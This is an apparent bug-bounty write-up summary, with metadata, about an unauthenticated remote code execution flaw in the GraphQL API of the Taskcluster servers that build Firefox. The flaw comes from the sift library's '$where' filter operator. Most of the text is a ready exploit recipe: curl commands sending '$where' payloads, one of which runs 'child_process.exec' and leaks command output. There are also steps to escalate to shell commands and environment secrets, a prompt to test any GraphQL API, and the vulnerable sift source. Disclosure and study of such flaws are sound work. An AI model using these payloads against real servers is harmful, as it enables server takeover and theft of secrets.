---
id: edfeaf613ca2
title: "$12,000 for one GraphQL field: unauthenticated RCE on the servers that build Firefox"
source_url: https://pawanjswal.medium.com/12-000-for-one-graphql-field-unauthenticated-rce-on-the-servers-that-build-firefox-fc3ec1467fa0
author: "Pawan Jaiswal"
publication_date: 2026-08-18
category: rce
category_label: "RCE / Code Execution"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "infosec"
  - "graphql-security"
  - "bug-bounty"
  - "hacking"
  - "cybersecurity"
tools:
  - "curl"
quick_test: "Test any GraphQL API that accepts free-form JSON filters for the presence of $where operators and check if unauthenticated requests can execute code."
---

## Use case

The vulnerability existed in a public GraphQL API endpoint that allowed unauthenticated users to execute arbitrary JavaScript code on the server due to improper validation of a free-form JSON filter argument. This led to total compromise of the Taskcluster instance used for building Firefox.

## Steps to test

1. Send a POST request to the /graphql endpoint with a JSON body containing a filter argument that includes a $where operator.
2. For example, use a payload like { 'filter': { '$where': 'true' } } to confirm code execution.
3. Check the response for any output that indicates the code was executed, such as error messages or calculated values.
4. Escalate by modifying the $where payload to execute shell commands or read sensitive environment variables.

## Commands

```text
curl -X POST https://example.com/graphql -H 'Content-Type: application/json' -d '{ "filter": { "$where": "true" } }'
curl -X POST https://example.com/graphql -H 'Content-Type: application/json' -d '{ "filter": { "$where": "RCE_ + (1 + 1)" } }'
curl -X POST https://example.com/graphql -H 'Content-Type: application/json' -d '{ "filter": { "$where": "require('child_process').exec('id', (err, stdout) => { throw new Error(stdout); })" } }'
import sift from 'sift';
export default (filter, array) => {
if (!array) return [];
return filter ? array.filter(sift(filter)) : array;
};
const $where = (params, ownerQuery, options) => {
let test;
if (isFunction(params)) {
test = params;
} else if (!process.env.CSP_ENABLED) {
test = new Function("obj", "return " + params);   // <-- string becomes code
} else {
throw new Error(`In CSP mode, sift does not support strings in "$where" condition`);
}
return new EqualsOperation((b) => test.bind(b)(b), ownerQuery, options);
};
Query.expandScopes(scopes, filter)
-> loaders/scopes.js : auth.expandScopes({ scopes })  then  sift(filter, expandedScopes)
```

## Source

- Author: Pawan Jaiswal
- Writeup: https://pawanjswal.medium.com/12-000-for-one-graphql-field-unauthenticated-rce-on-the-servers-that-build-firefox-fc3ec1467fa0

_For authorized testing only. Credit the original author._
